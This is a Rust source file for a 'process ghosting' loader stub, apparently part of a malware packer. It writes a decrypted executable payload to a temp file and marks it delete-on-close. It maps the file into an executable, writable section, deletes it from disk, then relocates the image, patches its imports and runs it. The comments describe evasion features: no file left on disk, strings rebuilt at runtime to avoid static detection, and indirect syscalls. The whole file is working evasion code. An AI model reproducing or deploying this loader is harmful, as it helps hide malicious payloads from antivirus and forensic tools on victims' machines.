// --- Process ghosting (technique fragment) ---
//
// Runs the decrypted PE with no backing file on disk. The payload is written
// to a unique temp file, re-opened with delete-on-close, turned into a section
// and mapped into the current process; the file handle is then closed so the
// file's name disappears while the section keeps the bytes alive. The mapped
// image is relocated, has its imports resolved, and its entry point runs on
// this thread. See `README.md` for the full write-up.
//
// The file -> section -> map flow is Win32 (`CreateFileW`,
// `SetFileInformationByHandle`, `CreateFileMappingW`, `MapViewOfFile`,
// `CloseHandle`), so this fragment is the same for `build.stub.syscalls.mode:
// none` and `mode: indirect` and adds no Nt* helper to the syscall layer.
//
// Per-build values (the temp-file stem, every diagnostic) are substituted by
// `Params::render_fragment_for` with code that rebuilds the string at runtime,
// so no stem and no diagnostic ever lands in `.rdata` in cleartext.

use core::ffi::c_void;
use core::ptr;
use core::sync::atomic::{AtomicU32, Ordering};

use windows::core::PCWSTR;
use windows::Win32::Foundation::{BOOLEAN, CloseHandle, GetLastError, HANDLE};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, SetFileInformationByHandle, DELETE, FILE_ATTRIBUTE_NORMAL, FILE_DISPOSITION_INFO,
    FILE_READ_DATA, FILE_SHARE_DELETE, FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_WRITE_DATA,
    OPEN_EXISTING, FileDispositionInfo,
};
use windows::Win32::System::Diagnostics::Debug::{
    IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT,
};
use windows::Win32::System::Memory::{
    CreateFileMappingW, MapViewOfFile, FILE_MAP_ALL_ACCESS, PAGE_EXECUTE_READWRITE,
};
use windows::Win32::System::SystemServices::{
    IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE,
    IMAGE_REL_BASED_ABSOLUTE, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGH, IMAGE_REL_BASED_HIGHLOW,
    IMAGE_REL_BASED_LOW,
};

/// The image's NT headers, for the architecture the stub is built for.
#[cfg(target_arch = "x86_64")]
type NtHeaders = windows::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
#[cfg(target_arch = "x86")]
type NtHeaders = windows::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;

/// The optional-header magic the payload must have: PE32+ for an x64 stub,
/// PE32 for an x86 one (the packer enforces the same rule at build time).
#[cfg(target_arch = "x86_64")]
const EXPECTED_MAGIC: u16 = 0x20b;
#[cfg(target_arch = "x86")]
const EXPECTED_MAGIC: u16 = 0x10b;

/// Entry point signature of the mapped EXE (returns the process exit code).
type ExeEntryPoint = unsafe extern "system" fn() -> u32;

/// A monotonically increasing suffix so two ghost files in one process never
/// collide on the same temp path.
static GHOST_SEQ: AtomicU32 = AtomicU32::new(0);

/// A base relocation entry (type + offset packed in a `u16`).
#[repr(C)]
struct BaseRelocationEntry {
    data: u16,
}

impl BaseRelocationEntry {
    fn offset(&self) -> u16 {
        self.data & 0x0FFF
    }

    fn type_(&self) -> u16 {
        self.data >> 12
    }
}

/// Formats a failed Win32 call as `"<label> (0x<code>)"`. `label` is
/// substituted with a runtime reconstruction, so the diagnostic text itself is
/// never stored in the stub.
fn win_error(label: String) -> String {
    let code = unsafe { GetLastError().0 };
    format!("{label} (0x{code:08x})")
}

/// Adapter the stub skeleton calls (`run()` passes the decrypted payload here).
/// Ghosts the payload file, maps it through a section and runs its
/// entry point after the file has disappeared.
pub fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    // The payload runs in *this* process and reads its command line from the
    // PEB (`GetCommandLineW`). Repoint it at the payload's own arguments first.
    crate::patch_command_line()?;
    crate::tech_dbg!("process_ghosting", "ghosting a {}-byte payload", image.len());

    let path = write_temp_file(image)?;
    let file = open_delete_on_close(&path)?;
    let section = create_section(file)?;
    let view = map_view(section)?;

    // The delete-on-close disposition takes effect when the file handle closes:
    // the name disappears, but the section (and this view) keep the bytes
    // alive. This is the "ghost": the image runs with no backing file on disk.
    let _ = unsafe { CloseHandle(file) };
    crate::tech_dbg!("process_ghosting", "file deleted; the section keeps the image");

    let nt = get_headers(view, image.len())?;
    fix_imports(view, image.len(), nt)?;
    fix_relocations(view, nt)?;
    execute_entrypoint(view, nt)
}

/// Writes the payload to a unique file under the process temp directory and
/// returns its NUL-terminated UTF-16 path.
fn write_temp_file(image: &[u8]) -> Result<Vec<u16>, String> {
    let stem: String = $TEMP_STEM_DEF$;
    let seq = GHOST_SEQ.fetch_add(1, Ordering::Relaxed);
    let path = std::env::temp_dir().join(format!("{stem}_{}_{}", std::process::id(), seq));
    std::fs::write(&path, image).map_err(|_| $MSG_WRITE_FAILED$)?;
    let mut wide: Vec<u16> = path.to_string_lossy().encode_utf16().collect();
    wide.push(0);
    Ok(wide)
}

/// Re-opens the written file with delete access and every share mode, then
/// marks it delete-on-close. Closing the returned handle deletes the file's
/// name; a section created from it first keeps the bytes alive.
fn open_delete_on_close(path: &[u16]) -> Result<HANDLE, String> {
    let handle = unsafe {
        CreateFileW(
            PCWSTR(path.as_ptr()),
            (FILE_READ_DATA | FILE_WRITE_DATA | DELETE).0,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE(ptr::null_mut()),
        )
    }
    .map_err(|_| win_error($MSG_OPEN_FAILED$))?;

    let disposition = FILE_DISPOSITION_INFO { DeleteFile: BOOLEAN(1) };
    if unsafe {
        SetFileInformationByHandle(
            handle,
            FileDispositionInfo,
            &disposition as *const FILE_DISPOSITION_INFO as *const c_void,
            std::mem::size_of::<FILE_DISPOSITION_INFO>() as u32,
        )
    }
    .is_err()
    {
        let _ = unsafe { CloseHandle(handle) };
        return Err(win_error($MSG_DISPOSITION_FAILED$));
    }

    Ok(handle)
}

/// Creates a `PAGE_EXECUTE_READWRITE` section over the whole file. The section
/// is what keeps the file's bytes alive after the file handle is closed, and
/// the writable+executable protection is what lets the mapped view be patched
/// (relocations, imports) and then executed.
fn create_section(file: HANDLE) -> Result<HANDLE, String> {
    unsafe {
        CreateFileMappingW(
            file,
            None,
            PAGE_EXECUTE_READWRITE,
            0,
            0,
            PCWSTR(ptr::null()),
        )
    }
    .map_err(|_| win_error($MSG_SECTION_FAILED$))
}

/// Maps the section into this process. The returned pointer covers the whole
/// file (the payload's bytes) for the lifetime of the mapping.
fn map_view(section: HANDLE) -> Result<*mut u8, String> {
    let view = unsafe { MapViewOfFile(section, FILE_MAP_ALL_ACCESS, 0, 0, 0) };
    if view.Value.is_null() {
        return Err(win_error($MSG_MAP_FAILED$));
    }
    Ok(view.Value as *mut u8)
}

/// Validates the mapped image and returns its NT headers.
fn get_headers(view: *mut u8, len: usize) -> Result<*const NtHeaders, String> {
    let image = unsafe { std::slice::from_raw_parts(view, len) };
    if image.len() < std::mem::size_of::<IMAGE_DOS_HEADER>() {
        return Err($MSG_FILE_TOO_SMALL$);
    }

    unsafe {
        let dos = image.as_ptr() as *const IMAGE_DOS_HEADER;
        if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
            return Err($MSG_BAD_DOS$);
        }

        let nt = (dos as usize + (*dos).e_lfanew as usize) as *const NtHeaders;
        if (*nt).Signature != IMAGE_NT_SIGNATURE {
            return Err($MSG_BAD_NT$);
        }

        // The packer already rejects a payload whose arch differs from
        // `build.output.arch`, but keep a defensive check here.
        if (*nt).OptionalHeader.Magic.0 != EXPECTED_MAGIC {
            return Err($MSG_BAD_ARCH$);
        }

        Ok(nt)
    }
}

/// Resolves the payload's imports and writes them into its IAT. The mapped
/// view is the image, so RVA == offset from the view base; the shared resolver
/// makes the IAT writable only while it writes.
fn fix_imports(view: *mut u8, len: usize, nt: *const NtHeaders) -> Result<(), String> {
    let import_dir =
        unsafe { (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT.0 as usize] };
    if import_dir.Size == 0 || import_dir.VirtualAddress == 0 {
        return Ok(());
    }

    let image = unsafe { std::slice::from_raw_parts_mut(view, len) };
    let count = crate::patch_imports(
        image,
        import_dir.VirtualAddress,
        import_dir.Size,
        crate::resolution_policy,
    )
    .map_err(|e| e.to_string())?;
    crate::tech_dbg!("process_ghosting", "IAT patched ({count} import(s))");
    Ok(())
}

/// Applies base relocations for the view's actual base (delta from the
/// payload's preferred base; a no-op when the section happened to map at the
/// preferred address).
fn fix_relocations(view: *mut u8, nt: *const NtHeaders) -> Result<(), String> {
    unsafe {
        let reloc_dir =
            (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC.0 as usize];
        if reloc_dir.Size == 0 || reloc_dir.VirtualAddress == 0 {
            return Ok(());
        }

        let preferred = (*nt).OptionalHeader.ImageBase as isize;
        let delta = view as isize - preferred;
        if delta == 0 {
            return Ok(());
        }

        let mut block = (view as usize + reloc_dir.VirtualAddress as usize)
            as *const IMAGE_BASE_RELOCATION;
        while (*block).VirtualAddress != 0 {
            let block_size = (*block).SizeOfBlock as usize;
            let count = (block_size - std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                / std::mem::size_of::<u16>();
            let entries = (block as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                as *const BaseRelocationEntry;

            for i in 0..count {
                let entry = entries.add(i);
                let target = (view as usize
                    + (*block).VirtualAddress as usize
                    + (*entry).offset() as usize) as *mut isize;

                match (*entry).type_() as u32 {
                    IMAGE_REL_BASED_ABSOLUTE => {}
                    IMAGE_REL_BASED_DIR64 => {
                        *target += delta;
                    }
                    IMAGE_REL_BASED_HIGHLOW => {
                        let target32 = target as *mut u32;
                        *target32 = (*target32 as isize + delta) as u32;
                    }
                    IMAGE_REL_BASED_HIGH => {
                        let target16 = target as *mut u16;
                        *target16 = (*target16 as isize + (delta >> 16)) as u16;
                    }
                    IMAGE_REL_BASED_LOW => {
                        let target16 = target as *mut u16;
                        *target16 = (*target16 as isize + (delta & 0xFFFF)) as u16;
                    }
                    _ => {}
                }
            }

            block = (block as usize + block_size) as *const IMAGE_BASE_RELOCATION;
        }
    }
    Ok(())
}

/// Runs the payload's entry point on this thread and returns its exit code.
///
/// The payload keeps the stub's thread rather than getting a fresh one, exactly
/// like reflective loading: a payload that calls `ExitProcess` ends the process
/// as it would from a thread it created itself.
fn execute_entrypoint(view: *mut u8, nt: *const NtHeaders) -> Result<i32, String> {
    let entry_rva = unsafe { (*nt).OptionalHeader.AddressOfEntryPoint } as usize;
    if entry_rva == 0 {
        return Err($MSG_NO_ENTRY$);
    }

    let entry_point = view as usize + entry_rva;
    crate::tech_dbg!("process_ghosting", "jumping to entry point 0x{entry_point:x}");
    // SAFETY: `entry_point` is the payload's `AddressOfEntryPoint` inside the
    // executable section mapping, with a matching ABI.
    let exe_main: ExeEntryPoint = unsafe { std::mem::transmute(entry_point) };
    let code = unsafe { exe_main() } as i32;
    crate::tech_dbg!("process_ghosting", "payload returned {code}");
    Ok(code)
}
